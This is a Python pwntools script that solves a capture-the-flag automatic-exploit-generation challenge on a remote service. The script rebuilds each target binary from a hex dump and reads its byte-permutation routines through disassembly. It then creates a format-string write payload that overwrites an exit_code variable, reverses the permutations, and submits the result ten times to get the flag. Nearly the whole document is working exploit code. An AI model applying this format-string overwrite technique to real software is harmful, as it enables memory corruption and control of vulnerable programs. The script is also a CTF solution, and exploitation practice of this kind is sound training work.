#!/usr/bin/env python3

from pwn import *

def getbinary(r):
	f = open('aeg2','wb')

	while True:
		_ = r.recvline()
		if b'0: ' in _:
			for i in _.split()[1:9]: f.write(int(i,16).to_bytes(2,'big'))
		if b'Binary' in _:
			ec = int(_.decode().strip().split()[-1],10)
			break

	f.close()
	return ec

def p1(s,k): return s[::-1]

def p2(s,k): return s[0x100:] + s[:0x100]

def p3(s,k): return s[k:] + s[:k]

def p4(s,k): return s[k:] + s[:k]

def p5(s,k):
	for i in range(0,len(s),2): s[i], s[i+1] = s[i+1], s[i]
	return s

def p6(s,k):
	for i in range(0,len(s),k): s[i:i+k] = [s[i+k-1]] + s[i:i+k-1]
	return s

def p7(s,k):
	for i in range(0,len(s),k): s[i:i+k] = s[i+1:i+k] + [s[i]]
	return s

def p8(s,k):
	for i in range(0,len(s),k): s[i:i+k] = s[i:i+k][::-1]
	return s

def h1(p,binary):
	a = eval('binary.sym.permute' + str(p))
	b = eval('binary.sym.permute') if p == 8 else eval('binary.sym.permute' + str(p+1))
	f = binary.disasm(a,b-a).find('add    DWORD PTR [rbp-0x21c], 0x')
	if f == -1: f = binary.disasm(a,b-a).find('sub    DWORD PTR [rbp-0x21c], 0x')
	r = int(binary.disasm(a,b-a)[f:].split('\n')[0].split(', ')[1],16)
	if r == 0xffffff80: r = 0x80
	return r

def h2(p,binary):
	a = eval('binary.sym.permute' + str(p))
	b = eval('binary.sym.permute' + str(p+1))
	f = binary.disasm(a,b-a).find('mov    DWORD PTR [rbp-0x218], 0x')
	r = int(binary.disasm(a,b-a)[f:].split('\n')[0].split(', ')[1],16)
	return r


r = remote('pwn.utctf.live', 5002)
r.sendline()

for z in range(10):
	ec = getbinary(r)
	log.info(f'ec: {ec}')

	binary = context.binary = ELF('./aeg2',checksec=False)
	offset = 8

	payload  = b''
	payload += fmtstr_payload(offset,{binary.sym.exit_code:ec})
	payload += (0x200 - len(payload)) * b'\0'

	s = [*payload]
	for i in [ x for x in binary.disasm(binary.sym.permute,binary.sym.main-binary.sym.permute).split('\n') if 'call' in x][::-1]:
		j = int(i.split()[-1],16)
		p = int(list(binary.sym.keys())[list(binary.sym.values()).index(j)][-1])
		k = 0
		if p > 5 and p < 9: k = h1(p,binary)
		if p == 3 or p == 4: k = h2(p,binary)
		s = globals()['p' + str(p)](s,k)
		
	r.sendlineafter(b'input: \n',bytes(s))
	os.rename('./aeg2','./aeg2.' + str(z))

r.recvuntil(b'utflag{')
flag = 'utflag{' + r.recvuntil(b'}').strip().decode()
r.close()
print(flag)
